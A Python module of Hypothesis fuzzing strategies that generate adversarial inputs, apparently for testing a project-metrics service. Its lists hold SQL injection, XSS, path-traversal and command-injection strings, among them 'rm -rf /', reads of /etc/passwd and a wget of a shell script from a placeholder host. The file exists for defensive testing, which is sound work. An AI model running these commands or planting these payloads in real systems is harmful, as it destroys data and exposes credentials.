"""
Hypothesis strategies for adversarial testing.

These strategies generate edge cases, malicious inputs, and boundary conditions
to test system resilience and security.
"""

from hypothesis import strategies as st
from typing import List


def malicious_strings() -> st.SearchStrategy[str]:
    """Generate potentially malicious strings for security testing."""
    return st.one_of([
        # Empty and whitespace
        st.just(""),
        st.just(" "),
        st.just("\t\n\r"),

        # Very long strings
        st.text(min_size=10000, max_size=100000),

        # SQL injection attempts
        st.sampled_from([
            "'; DROP TABLE projects; --",
            "' OR '1'='1",
            "'; SELECT * FROM users; --",
            "admin'--",
            "' UNION SELECT NULL--",
        ]),

        # XSS attempts
        st.sampled_from([
            "<script>alert('xss')</script>",
            "javascript:alert('xss')",
            "<img src=x onerror=alert('xss')>",
            "'\"><script>alert('xss')</script>",
        ]),

        # Path traversal
        st.sampled_from([
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "/etc/passwd",
            "../../.env",
            "../.git/config",
        ]),

        # Command injection
        st.sampled_from([
            "; rm -rf /",
            "| cat /etc/passwd",
            "&& wget malicious.com/shell.sh",
            "`rm -rf /`",
            "$(rm -rf /)",
        ]),

        # Null bytes and control characters
        st.text(alphabet="\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f"),

        # Unicode edge cases
        st.sampled_from([
            "测试项目",  # Chinese characters
            "тест",      # Cyrillic
            "اختبار",     # Arabic
            "🚀💻🔥",     # Emoji
            "\u202e",    # Right-to-left override
            "\ufeff",    # Zero-width no-break space
        ]),

        # JSON/XML breaking
        st.sampled_from([
            '{"test": "value"}',
            "<xml>test</xml>",
            "null",
            "undefined",
            "true",
            "false",
        ]),

        # Format string attacks
        st.sampled_from([
            "%s%s%s%s%s%s",
            "%x%x%x%x%x%x",
            "{0}{1}{2}{3}",
            "{{}}",
        ]),
    ])


def edge_case_numbers() -> st.SearchStrategy[int]:
    """Generate edge case numbers that might break calculations."""
    return st.one_of([
        # Boundary values
        st.just(0),
        st.just(-1),
        st.just(1),

        # Large numbers
        st.just(2**31 - 1),    # Max 32-bit signed int
        st.just(2**32),        # Overflow 32-bit
        st.just(2**63 - 1),    # Max 64-bit signed int

        # Negative numbers
        st.just(-2**31),       # Min 32-bit signed int
        st.just(-2**63),       # Min 64-bit signed int

        # Powers of 2
        st.integers(min_value=0, max_value=63).map(lambda x: 2**x),

        # Random large numbers
        st.integers(min_value=10**10, max_value=10**15),
    ])


def invalid_time_windows() -> st.SearchStrategy[str]:
    """Generate invalid time window strings."""
    return st.one_of([
        # Empty/null
        st.just(""),
        st.just(" "),

        # Wrong format
        st.sampled_from([
            "1.5d",
            "24hours",
            "1 day",
            "seven days",
            "1D",  # Wrong case
            "7Days",
            "24H",
        ]),

        # Negative values
        st.sampled_from([
            "-1d",
            "-24h",
            "-7d",
        ]),

        # Zero values
        st.sampled_from([
            "0d",
            "0h",
            "0m",
        ]),

        # Invalid units
        st.sampled_from([
            "7x",
            "24z",
            "1y",  # Years not supported
            "1w",  # Weeks not supported
        ]),

        # Very large values
        st.sampled_from([
            "999999d",
            "99999999h",
            "1000000000d",
        ]),

        # Injection attempts
        st.sampled_from([
            "1d; rm -rf /",
            "7d && wget malicious.com",
            "24h | cat /etc/passwd",
        ]),

        # Malicious strings as time windows
        malicious_strings(),
    ])


def malformed_json() -> st.SearchStrategy[str]:
    """Generate malformed JSON strings."""
    return st.sampled_from([
        "{",
        "}",
        '{"key":}',
        '{"key": "value",}',  # Trailing comma
        '{key: "value"}',     # Unquoted key
        "{'key': 'value'}",   # Single quotes
        '{"key": "value"',    # Missing closing brace
        '{"key": value"}',    # Unquoted value
        '{"key": "value", "key": "value2"}',  # Duplicate keys
        '{"key": undefined}', # JavaScript undefined
        '{"key": NaN}',       # JavaScript NaN
        '{"key": Infinity}',  # JavaScript Infinity
    ])


def oversized_inputs() -> st.SearchStrategy[str]:
    """Generate inputs that are too large."""
    return st.one_of([
        # Very long strings
        st.text(min_size=1000000),  # 1MB string

        # Deeply nested structures (as strings)
        st.integers(min_value=1000, max_value=10000).map(
            lambda n: '{"a":' * n + '1' + '}' * n
        ),

        # Repeated patterns
        st.text(min_size=1, max_size=10).flatmap(
            lambda pattern: st.integers(min_value=10000, max_value=100000).map(
                lambda count: pattern * count
            )
        ),
    ])


@st.composite
def adversarial_project_data(draw) -> dict:
    """Generate adversarial project data for testing robustness."""
    return {
        "project_key": draw(malicious_strings()),
        "total_tests": draw(edge_case_numbers()),
        "qtest_tests": draw(edge_case_numbers()),
        "time_window": draw(invalid_time_windows()),
    }